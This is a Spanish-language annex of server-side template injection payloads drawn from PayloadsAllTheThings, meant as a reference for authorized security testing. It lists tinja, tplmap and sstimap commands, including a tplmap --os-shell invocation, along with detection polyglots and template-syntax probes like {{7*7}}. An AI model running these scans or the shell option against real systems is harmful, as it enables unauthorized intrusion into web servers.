# Server-Side Template Injection (SSTI): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Server Side Template Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección en plantillas del servidor / Herramientas

```bash
  tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
  tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```

```powershell
  python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```

```bash
  python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
  python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
  python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
```

## 2. Metodología / Universal Detection Payloads

```ps1
${{<%[%'"}}%\.
```

```powershell
{{ ... }}
${ ... }
#{ ... }
<%= ... %>
{ ... }
{{= ... }}
{= ... }
\n= ... \n
*{ ... }
@{ ... }
@( ... )
```

```powershell
7 * 7
```

```powershell
(1/0).zxy.zxy
```

### Variantes presentes en tablas o texto del apartado

```text
(3*4/2)
3*)2(/4
((7*8)/(2*4))
7)(*)8)(2/(*4
```

## 3. Manual Detection and Exploitation / Inject Template Syntax

```ps1
${{<%[%'"}}%\.
```

### Variantes presentes en tablas o texto del apartado

```text
{{7*7}}
#{7*7}
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
